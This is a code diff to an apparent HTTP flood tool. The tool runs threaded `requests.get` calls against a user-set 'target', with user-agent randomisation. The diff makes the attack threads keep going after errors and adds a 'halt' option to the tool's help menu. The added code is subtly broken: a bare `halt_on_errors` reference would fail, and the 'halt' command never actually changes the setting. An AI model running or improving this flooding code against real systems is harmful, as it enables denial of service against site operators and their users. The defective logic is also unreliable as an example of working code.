@@ -56,6 +56,8 @@ class settings:
     targetthreads = 1
     threads = []
 
+    halt_on_errors = False
+
     reqmade = 0
     running = False
     target = ""
@@ -92,8 +94,16 @@ def reqattack(target, stop_event):
             "User-Agent": useragent
         }
 
-        requests.get(target, headers=header)
-        settings.reqmade += 1
+        try:
+            requests.get(target, headers=header)
+            settings.reqmade += 1
+        except Exception as e:
+            print("!!! THREAD ERROR !!! " + str(e))
+            if halt_on_errors:
+                print("HALTING...")
+                break
+            else:
+                print("NUH UH CONTINUING...")
 
 while True:
     if settings.running:
@@ -290,6 +300,19 @@ while True:
         else:
             successful = False
             print("!!! ERROR !!! Failed to stop attack (not currently attacking)")
+    
+    elif cmd.startswith("halt"):
+        try:
+            tf = cmd.split(" ")[1]
+        except IndexError:
+            tf = ""
+
+        if tf == "":
+            print("Value: " + str(settings.halt_on_errors))
+        elif tf == "true":
+            print("Halting on Future Errors")
+        else:
+            print("Continue on Errors")
 
     elif cmd == "guide" or cmd == "help":
         print("HIGGERSguide - Help Utility")
@@ -298,6 +321,7 @@ while True:
         print("useragent <string> - Set User Agent to a static string. (overwrites 'uarand')")
         print("uarand <mode> - Set User Agent Randomizer mode. (overwrites 'useragent') Valid options: words, nums/numbers")
         print("threads <target-num> - Set the number of threads to target on attack start")
+        print("halt <true/false> - Halt on errors")
         print("target <protocol://ip-or-domain> - Set target to attack")
         print("(ProTip: Executing any of there commands without arguments displays the current value)")
         print()
